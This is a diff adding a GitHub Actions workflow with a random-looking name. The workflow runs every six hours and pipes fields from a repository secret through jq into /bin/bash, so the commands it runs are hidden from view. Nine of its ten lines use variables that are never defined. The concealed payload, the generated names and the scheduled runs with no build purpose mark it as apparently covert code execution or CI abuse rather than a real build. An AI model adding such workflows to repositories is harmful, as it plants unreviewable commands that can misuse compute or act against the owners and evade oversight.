@@ -1,0 +1,28 @@
+name: olympicszealous
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: olympicszealous
+        env:
+          kku8: ${{ secrets.kku8 }}
+        run: |
+          echo $kku8 | jq -r .ftxe77976 | /bin/bash
+          echo $ziprd0 | jq -r .cod6685 | /bin/bash
+          echo $sbqa341 | jq -r .trzh261 | /bin/bash
+          echo $d9 | jq -r .mba5 | /bin/bash
+          echo $ztrc932 | jq -r .qraq9615 | /bin/bash
+          echo $ccq6 | jq -r .m348 | /bin/bash
+          echo $ubcf720 | jq -r .c52 | /bin/bash
+          echo $katwf8 | jq -r .feloy32360 | /bin/bash
+          echo $cob91 | jq -r .noy7185 | /bin/bash
+          echo $d13 | jq -r .od5357 | /bin/bash
+
